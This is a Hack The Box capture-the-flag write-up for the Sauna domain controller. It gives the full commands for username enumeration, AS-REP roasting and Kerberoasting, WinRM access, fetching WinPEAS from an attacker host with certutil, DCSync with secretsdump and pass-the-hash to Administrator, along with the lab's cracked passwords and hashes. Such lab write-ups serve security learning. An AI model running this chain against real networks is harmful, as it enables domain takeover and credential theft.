# Hack The Box – Sauna
**Completed:** *June 9th, 2026*  
**Platform:** Hack The Box  
**Difficulty:** Easy | Active Directory, OSINT, AS-REP Roasting, AutoLogon Credential Disclosure, DCSync, Pass-the-Hash

> This write-up is for educational purposes only. All activity was conducted within a legal, isolated lab environment provided by Hack The Box.

Sauna is a Windows Domain Controller that chains together several well-known AD attack paths: OSINT-driven username generation from a public-facing website, AS-REP roasting to gain an initial foothold, AutoLogon credential exposure via WinPEAS, and finally DCSync through a service account with domain replication rights. No exploits required, just methodical enumeration and abuse of misconfigured AD features.

---

## Target: Windows Server 2019 Domain Controller

---

## Nmap Scan

```bash
nmap -sS -sV -sC -T4 --min-rate 500 <IP>
```

The port layout immediately signals a Domain Controller: DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), WinRM (5985), and HTTP (80) are all present. The combination of Kerberos, LDAP, and DNS on a single host is a reliable DC fingerprint. The domain name `EGOTISTICAL-BANK.LOCAL` was confirmed separately via NetExec:

```bash
nxc smb <IP>
```

```
SMB    <IP>    445    SAUNA    [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
```

**Key ports:**

| Port | Service | Note |
|------|---------|------|
| 53 | DNS | Domain DNS |
| 80 | HTTP | Web server, attack surface worth investigating |
| 88 | Kerberos | Confirms DC role |
| 389/3268 | LDAP | Domain: `EGOTISTICAL-BANK.LOCAL` |
| 445 | SMB | Checked for null access |
| 5985 | WinRM | Remote management, useful with valid credentials |

---

## DNS Enumeration

First thing to try against any DC is a zone transfer. If misconfigured, it dumps the entire DNS zone including all hostnames and IPs.

```bash
dig axfr EGOTISTICAL-BANK.LOCAL @<IP>
```

The transfer failed. Nothing actionable came back, so DNS was a dead end here.

---

## LDAP Enumeration

With anonymous LDAP bind, you can sometimes pull full user and group listings without any credentials. Tested it:

```bash
ldapsearch -x -H ldap://<IP> -b "DC=EGOTISTICAL-BANK,DC=local"
```

Anonymous bind was permitted but returned limited data. The output confirmed the domain structure and leaked one name, `Hugo Smith`, but the user container itself was not enumerable without credentials. Not enough to work with directly, but it confirmed the domain base DN and that the DC was reachable over LDAP.

```
# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL

# numEntries: 15
# numReferences: 3
```

---

## SMB Enumeration

Tested for null/anonymous access against SMB:

```bash
smbclient -L //<IP>/ -N
```

Access was denied. Unlike the typical DC misconfigurations seen on older boxes, anonymous SMB access was locked down here. With DNS, LDAP, and SMB all returning limited or nothing useful, the HTTP server on port 80 became the next logical target.

---

## Web Enumeration and OSINT Username Generation

The web server hosted a corporate site for Egotistical Bank. The site itself was mostly static, but the "Our Team" page listed six employees by full name:

```
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

In a real-world AD environment, user accounts are almost always derived from employee names following a predictable naming convention, typically some combination of first name, last name, and initials. Rather than guessing manually, the names were saved to a file and fed into `username-anarchy`, which generates every common AD username variant automatically:

```bash
./username-anarchy -i users.txt > usernames.txt
```

This produced a list covering formats like `fsmith`, `fergus.smith`, `f.smith`, `smithf`, and so on. With a wordlist in hand, the next step was validating which of these actually exist as domain accounts before attempting any attacks.

---

## Username Enumeration with Kerbrute

Kerbrute validates usernames against Kerberos without triggering lockout policies. Valid usernames get a response from the KDC; invalid ones get an error. It is significantly faster and quieter than spraying credentials.

```bash
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc <IP> usernames.txt -o valid_users.txt
```

```
2026/06/09 10:14:22 >  [+] VALID USERNAME:    fsmith@EGOTISTICAL-BANK.LOCAL
2026/06/09 10:14:22 >  [+] VALID USERNAME:    hsmith@EGOTISTICAL-BANK.LOCAL
2026/06/09 10:14:22 >  [!] fsmith@EGOTISTICAL-BANK.LOCAL - Got AS-REP (no pre-auth required!)
```

Two valid accounts confirmed: `fsmith` and `hsmith`. Kerbrute also flagged that `fsmith` has Kerberos pre-authentication disabled, which means it is AS-REP roastable. It returned a hash inline, but in etype 18 format which hashcat cannot crack:

```
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:5571f523e3fbeae0ea46e813927ba501$8b6d9f1b5c607df5dbaa24d1d3507dd972770c1ad72188334437c95e80b549bd190d810c94174746361820ca3c6b97a5a7ce3580775b5d218b837a0c8334e0129a867da59b740a02039fd2cfadacf7da3c31bd0fbacecbadc93e759a38fdb030dd399f5d929fe515beb94b566b4b9f4f186e46cb54b90afadd7eb1a7f277419f0aece949b5b69cb8d65c7462298b5e3510bedaa40a030dea7c1f0e12d1c3526a09932c19ec2de28912a7d3f7aa119be60c0b78eb9944d0ff177e39bfc651999d350dce58781f098264c53a47f0a24d9e3e2635185a0fa1f3c7e039eb6483b290d04ca484c64bc302095d57ab0bf6edbb8a001050f51aa4ac9c022f466ea7ed4c03b316717450ce70b538ef4d9c7e212aa8f0e9b30cba
```

Kerbrute returned an AS-REP hash using AES-256 (etype 18). Because the cracking workflow here used Hashcat mode 18200, which expects RC4-HMAC (etype 23), the account was re-roasted with NetExec to obtain an RC4-compatible hash for cracking.

---

## AS-REP Roasting

AS-REP roasting works against accounts that have the "Do not require Kerberos preauthentication" flag set. Normally, authenticating to Kerberos requires the client to prove it knows the password first by encrypting a timestamp. With pre-auth disabled, the KDC will issue an AS-REP response to anyone who asks, with part of it encrypted using the account's password hash. That encrypted blob can then be taken offline and cracked.

NetExec was used to re-roast `fsmith` and get the etype 23 hash in a hashcat-compatible format:

```bash
nxc ldap <IP> -u fsmith -p '' --asreproast a.txt
```

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:f4108b679e5f60108e05ff2ff1dc8b93$086ab6495b47a76dda408b37cfa78f7987a7fca36036b3230ce2d03671e40269dbb3e66f0997af86adadd5c5e698ccef2b9f61c3db6273e8a877d64fc43538ae4151fe0731c7977ab5c375cca0a0ff07dfe09815d9e0b59889b9b6d1c03952e4f0c87551e7b7075c7908ee1d1a2c3316c231f1cb5de2f722fbc16f630440e91af301f6fe3d150c5fc3856932cdf0ac33491f08c0a25b305e320463df59f87c783b8f6e9b3fea00b6ea142d3eb007c8595cbd6cdc51be5d0ff8ee3f7ddca1df29cea25bb89a5d2ddd9e4e6befdbf4a2fe7748f6bc638a1f02e43f01b4bafa7ce420e087b85b5864723e7b47714b26fa9d6bc8777099a7d25a516f6be5b7d8039b
```

Cracked offline with hashcat mode 18200:

```bash
hashcat -a 0 -m 18200 '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:f4108b679e5f60108e05ff2ff1dc8b93$086ab6495b47a76dda408b37cfa78f7987a7fca36036b3230ce2d03671e40269dbb3e66f0997af86adadd5c5e698ccef2b9f61c3db6273e8a877d64fc43538ae4151fe0731c7977ab5c375cca0a0ff07dfe09815d9e0b59889b9b6d1c03952e4f0c87551e7b7075c7908ee1d1a2c3316c231f1cb5de2f722fbc16f630440e91af301f6fe3d150c5fc3856932cdf0ac33491f08c0a25b305e320463df59f87c783b8f6e9b3fea00b6ea142d3eb007c8595cbd6cdc51be5d0ff8ee3f7ddca1df29cea25bb89a5d2ddd9e4e6befdbf4a2fe7748f6bc638a1f02e43f01b4bafa7ce420e087b85b5864723e7b47714b26fa9d6bc8777099a7d25a516f6be5b7d8039b' /usr/share/wordlists/rockyou.txt
```

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...:Thestrokes23

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Recovered........: 1/1 (100.00%)
```

**Recovered credentials:** `fsmith : Thestrokes23`

---

## Authenticated Enumeration

With valid credentials, a broader picture of the domain was pulled using NetExec:

```bash
nxc ldap <IP> -u fsmith -p Thestrokes23 --users
```

```
LDAP    <IP>    389    SAUNA    [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP    <IP>    389    SAUNA    [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23
LDAP    <IP>    389    SAUNA    [*] Enumerated 6 domain users: EGOTISTICAL-BANK.LOCAL
LDAP    <IP>    389    SAUNA    -Username-       -Last PW Set-          -BadPW-  -Description-
LDAP    <IP>    389    SAUNA    Administrator    2021-07-27 02:16:16    0        Built-in account for administering the computer/domain
LDAP    <IP>    389    SAUNA    Guest            <never>                0        Built-in account for guest access to the computer/domain
LDAP    <IP>    389    SAUNA    krbtgt           2020-01-23 16:45:30    0        Key Distribution Center Service Account
LDAP    <IP>    389    SAUNA    HSmith           2020-01-23 16:54:34    0
LDAP    <IP>    389    SAUNA    FSmith           2020-01-24 03:45:19    0
LDAP    <IP>    389    SAUNA    svc_loanmgr      2020-01-25 10:48:31    0
```

Six domain users total. Three of interest: `fsmith` (our current account), `hsmith`, and `svc_loanmgr`. Group membership was checked for both `fsmith` and `svc_loanmgr`:

```bash
nxc ldap <IP> -u fsmith -p Thestrokes23 -M groupmembership -o USER=fsmith
nxc ldap <IP> -u fsmith -p Thestrokes23 -M groupmembership -o USER=svc_loanmgr
```

```
GROUPMEM...    [+] User: fsmith is member of following groups:
GROUPMEM...    Remote Management Users
GROUPMEM...    Domain Users

GROUPMEM...    [+] User: svc_loanmgr is member of following groups:
GROUPMEM...    Remote Management Users
GROUPMEM...    Domain Users
```

`fsmith` being in Remote Management Users confirms WinRM access. No privileged group memberships on either account, so there is no obvious direct path to DA from here. Also checked user descriptions for any embedded credentials, a common misconfiguration:

```bash
nxc ldap <IP> -u fsmith -p Thestrokes23 -M get-desc-users
```

Nothing useful. Only the default built-in descriptions came back. SMB shares were also checked with valid credentials, including SYSVOL, but nothing of immediate value was found.

---

## Foothold via WinRM

`fsmith` is in Remote Management Users, so WinRM access was available:

```bash
evil-winrm -i <IP> -u fsmith -p Thestrokes23
```

```
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

Foothold established. The user flag is on `fsmith`'s desktop:

```
*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
```

**User flag captured.**

BloodHound data collection was also kicked off at this point from the attack machine to map the domain:

```bash
bloodhound-python -u 'fsmith' -p 'Thestrokes23' -d EGOTISTICAL-BANK.LOCAL -dc SAUNA.EGOTISTICAL-BANK.LOCAL -ns <IP> -c All
```

---

## BloodHound Analysis and the hsmith Rabbit Hole

BloodHound showed no direct path to Domain Admin from `fsmith`. However it flagged `hsmith` as Kerberoastable, meaning the account has an SPN registered. Worth pursuing since cracking that hash could give access to a different account that might have elevated rights.

```bash
GetUserSPNs.py -dc-ip <IP> EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23 \
  -request \
  -outputfile all_tgs
```

The hash was recovered and cracked offline. The cracked password was `Thestrokes23`, identical to `fsmith`'s. Checking `hsmith`'s group memberships confirmed no privileges that `fsmith` did not already have. Dead end.

This is worth noting because Kerberoastable accounts are usually a high-value finding, but cracking the hash is only half the job. If the account has no meaningful access or its credentials are reused from an account you already have, the finding goes nowhere. Always verify privileges before treating a cracked hash as a win.

---

## Privilege Escalation: WinPEAS and AutoLogon Credential Disclosure

With no obvious path via BloodHound from `fsmith` and `hsmith` ruled out, local privilege escalation enumeration was the next step. WinPEAS was transferred to the target using `certutil` to pull it from a local Python HTTP server:

```bash
# On attack machine
python3 -m http.server 80

# On target via Evil-WinRM
certutil -urlcache -f http://<ATTACKER_IP>/winPEASx64.exe win.exe
.\win.exe > output.txt
```

Reviewing the output, WinPEAS flagged AutoLogon credentials stored in the registry in cleartext:

```
Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultDomainName    :  EGOTISTICALBANK
    DefaultUserName      :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword      :  Moneymakestheworldgoround!
```

AutoLogon stores credentials in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` so Windows can log in automatically on boot. Administrators set this up for kiosk machines or service boxes and often forget to clean it up. The credentials sit in the registry in plaintext, and any local user or process can read them.

**Recovered credentials:** `svc_loanmgr : Moneymakestheworldgoround!`

---

## DCSync via svc_loanmgr

Back in BloodHound, `svc_loanmgr` was checked. The account holds `GetChanges` and `GetChangesAll` rights over the domain object. Together, these two ACEs are the exact permissions required to perform a DCSync attack.

DCSync abuses the legitimate AD replication protocol. Domain Controllers replicate directory data between each other using the `MS-DRSR` protocol, and any account with `GetChanges` + `GetChangesAll` can impersonate a DC and request a full replication dump, including NTLM hashes for every account in the domain. This is not an exploit, it is a deliberate abuse of normal AD functionality granted to the wrong account.

`secretsdump.py` was used to target the Administrator account directly:

```bash
secretsdump.py -just-dc-user administrator EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@<IP>
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
[*] Cleaning up...
```

Administrator's NTLM hash recovered.

---

## Domain Admin Access via Pass-the-Hash

With the NTLM hash, the plaintext password is not needed. Pass-the-Hash authenticates directly using the hash itself, since NTLM authentication is based on the hash, not the plaintext.

```bash
impacket-wmiexec administrator@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

```
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>whoami
egotistical-bank\administrator

C:\>type C:\Users\Administrator\Desktop\root.txt
```

**Root flag captured.**

---

## Summary

| Phase | Finding |
|-------|---------|
| Web Enumeration | Employee names on "Our Team" page used to generate username candidates |
| Username Validation | `kerbrute` confirmed `fsmith` and `hsmith`; flagged `fsmith` as AS-REP roastable |
| AS-REP Roasting | Kerbrute returned etype 18 hash (incompatible with hashcat); re-roasted via `nxc` to get etype 23; cracked to `Thestrokes23` |
| Authenticated Enumeration | 6 domain users identified; no privileged group memberships on `fsmith` |
| Foothold | WinRM access as `fsmith` via Evil-WinRM |
| Kerberoasting Rabbit Hole | `hsmith` Kerberoastable but cracked to identical password with no additional privileges |
| Credential Disclosure | WinPEAS found AutoLogon registry entry exposing `svc_loanmgr:Moneymakestheworldgoround!` |
| DCSync | `svc_loanmgr` held `GetChanges` + `GetChangesAll` ACEs; `secretsdump.py` dumped Administrator NTLM hash |
| DA Access | Pass-the-Hash via `impacket-wmiexec` as Administrator |

---

## Lessons Learned

The initial foothold here depended entirely on OSINT from the web server. The domain had no anonymous SMB or LDAP access worth exploiting, which pushed the attack toward the one surface that was open: the company website. Employee names on public-facing pages are a genuine attack vector in real environments, not just a CTF mechanic. `username-anarchy` paired with `kerbrute` is a fast, low-noise way to go from names to confirmed valid accounts.

The etype 18 vs etype 23 issue with kerbrute is a common trip-up. Kerbrute outputs AES-256 hashes because that is what the KDC returns by default when the account supports it. Hashcat mode 18200 expects RC4. If you try to crack an etype 18 hash with mode 18200, it will not find the match even if the password is in your wordlist. Re-requesting via `nxc --asreproast` forces the RC4 downgrade and gives you a crackable hash.

The `hsmith` Kerberoast was a dead end, but worth running. You cannot know it leads nowhere until you crack the hash and check the account's rights. The methodology is correct; the finding just did not pay off here.

AutoLogon credential storage is a well-known misconfiguration that shows up more than it should. Credentials in `Winlogon` registry keys are readable by any local user. WinPEAS surfaces these automatically, which is a good argument for always running it on a foothold rather than relying only on BloodHound for the path forward.

The DCSync path was only possible because `svc_loanmgr` had replication rights. These ACEs exist legitimately on accounts used for LDAP sync tools like Azure AD Connect, but scoped too broadly or assigned to the wrong account they become a direct route to every hash in the domain. BloodHound is essential for catching this because the rights are not visible in standard group membership queries.
